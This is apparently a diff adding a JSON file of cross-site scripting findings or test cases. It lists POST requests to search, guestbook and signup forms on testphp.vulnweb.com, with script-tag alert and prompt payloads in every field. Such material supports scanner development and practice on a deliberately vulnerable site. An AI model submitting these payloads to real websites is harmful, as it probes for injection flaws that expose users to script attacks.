@@ -1,0 +1,22 @@
+[
+    {
+        "url_xss": "http://testphp.vulnweb.com/search.php?test=query",
+        "method": "POST",
+        "data": "{'searchFor': '<script>alert(6000/3000)</script>', 'goButton': 'goButton'}"
+    },
+    {
+        "url_xss": "http://testphp.vulnweb.com/search.php?test=query",
+        "method": "POST",
+        "data": "{'searchFor': '<script>prompt(5000/200)</script>', 'goButton': 'goButton'}"
+    },
+    {
+        "url_xss": "http://testphp.vulnweb.com/guestbook.php",
+        "method": "POST",
+        "data": "{'name': '<script>prompt(5000/200)</script>', 'submit': 'submit'}"
+    },
+    {
+        "url_xss": "http://testphp.vulnweb.com/secured/newuser.php",
+        "method": "POST",
+        "data": "{'uuname': '<script>prompt(5000/200)</script>', 'upass': '<script>prompt(5000/200)</script>', 'upass2': '<script>prompt(5000/200)</script>', 'urname': '<script>prompt(5000/200)</script>', 'ucc': '<script>prompt(5000/200)</script>', 'uemail': '<script>prompt(5000/200)</script>', 'uphone': '<script>prompt(5000/200)</script>', 'signup': 'signup'}"
+    }
+]
